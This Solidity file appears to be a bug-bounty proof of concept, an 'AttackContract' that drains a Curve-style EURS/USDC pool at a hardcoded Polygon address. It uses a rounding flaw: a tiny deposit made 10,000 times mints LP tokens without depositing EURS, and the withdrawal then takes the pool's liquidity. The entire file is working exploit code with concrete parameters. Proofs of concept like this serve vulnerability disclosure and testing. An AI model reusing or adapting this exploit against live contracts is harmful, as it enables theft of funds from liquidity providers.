pragma solidity ^0.8.13;

import "@immunefi/tokens/Tokens.sol";

import "./external/ICurve.sol";

contract AttackContract is Tokens {
    ICurve constant curve_pool = ICurve(0x2385D7aB31F5a470B1723675846cb074988531da);
    IERC20 constant EURS = IERC20(0xE111178A87A3BFf0c8d18DECBa5798827539Ae99);

    function initiateAttack() external {
        console.log("\n>>> Initiate attack\n");

        // Deal tokens to attacker
        console.log("> Deal 100 EURS and 100 USDC to attacker");
        deal(PolygonTokens.USDC, address(this), 100 * 1e6);
        deal(EURS, address(this), 100 * 1e2);

        uint256 attacker_euro_balance = EURS.balanceOf(address(this));
        uint256 attacker_usdc_balance = PolygonTokens.USDC.balanceOf(address(this));

        console.log("EURO balance of attacker:", attacker_euro_balance);
        console.log("USDC balance of attacker:", attacker_usdc_balance);

        uint256 curve_euro_balance = EURS.balanceOf(address(curve_pool));
        uint256 curve_usdc_balance = PolygonTokens.USDC.balanceOf(address(curve_pool));

        console.log("EURO balance of Curve pool:", curve_euro_balance);
        console.log("USDC balance of Curve pool:", curve_usdc_balance);

        // Execute attack multiple times to drain pool
        _executeAttack();
    }

    function _executeAttack() internal {
        console.log("\n>>> Execute attack\n");

        // Approve curve pool to use funds
        PolygonTokens.USDC.approve(address(curve_pool), PolygonTokens.USDC.balanceOf(address(this)));
        // EURS approval is not needed since calculated amount to deposit is 0
        // EURS.approve(address(curve_pool), EURS.balanceOf(address(this)));

        uint256 deposit = 18003307228925150;
        uint256 minQuoteAmount = 0;
        uint256 minBaseAmount = 0;
        uint256 maxQuoteAmount = 2852783032400000000000;
        uint256 maxBaseAmount = 7992005633260983540235600000000;
        uint256 deadline = 1676706352308;

        // Deposit small amount in a loop 10,000 times to gain curve LP tokens without depositing EURS
        // If gas price is 231 wei = 0.000000231651787155 => Gas = 161 matic
        console.log("> Deposit small amount to curve pool 10,000 times");
        for (uint256 i = 0; i < 10000; i++) {
            curve_pool.deposit(deposit, minQuoteAmount, minBaseAmount, maxQuoteAmount, maxBaseAmount, deadline);
        }

        uint256 attacker_euro_balance = EURS.balanceOf(address(this));
        uint256 attacker_usdc_balance = PolygonTokens.USDC.balanceOf(address(this));

        console.log("EURO balance of attacker:", attacker_euro_balance);
        console.log("USDC balance of attacker:", attacker_usdc_balance);

        console.log("> Withdraw curve pool LP tokens");
        uint256 curvesToBurn = curve_pool.balanceOf(address(this));
        console.log("CURVE balance of attacker:", curvesToBurn);
        // Withdraw curve LP tokens to receive proportion of liquidity in pool of EURS and USDC
        curve_pool.withdraw(curvesToBurn, deadline);

        _completeAttack();
    }

    function _completeAttack() internal {
        console.log("\n>>> Attack complete\n");

        uint256 attacker_euro_balance = EURS.balanceOf(address(this));
        uint256 attacker_usdc_balance = PolygonTokens.USDC.balanceOf(address(this));

        console.log("EURO balance of attacker:", attacker_euro_balance);
        console.log("USDC balance of attacker:", attacker_usdc_balance);

        uint256 curve_euro_balance = EURS.balanceOf(address(curve_pool));
        uint256 curve_usdc_balance = PolygonTokens.USDC.balanceOf(address(curve_pool));

        console.log("EURO balance of Curve pool:", curve_euro_balance);
        console.log("USDC balance of Curve pool:", curve_usdc_balance);
    }
}
